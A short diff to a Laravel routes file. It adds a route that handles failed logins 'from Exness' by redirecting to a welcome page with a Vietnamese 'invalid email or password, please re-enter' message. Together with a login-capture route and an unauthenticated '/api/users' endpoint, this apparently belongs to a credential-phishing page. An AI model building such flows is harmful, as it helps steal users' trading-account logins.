@@ -1,3 +1,4 @@
+
 <?php
 
 use Illuminate\Support\Facades\Route;
@@ -47,6 +48,13 @@ Route::middleware(['force.https'])->group(function () {
     });
 
     Route::post('/', [UserController::class, 'store'])->name('login.store');
+
     Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard')->middleware('admin.auth');
+
     Route::get('/api/users', [UserController::class, 'getUsersJson']);
+
+    // Route xử lý đăng nhập thất bại từ Exness
+    Route::get('/login-failed', function () {
+        return redirect()->secure('/welcome')->with('error', 'Thông tin email hoặc password không hợp lệ, vui lòng nhập lại');
+    })->name('login.failed');
 });
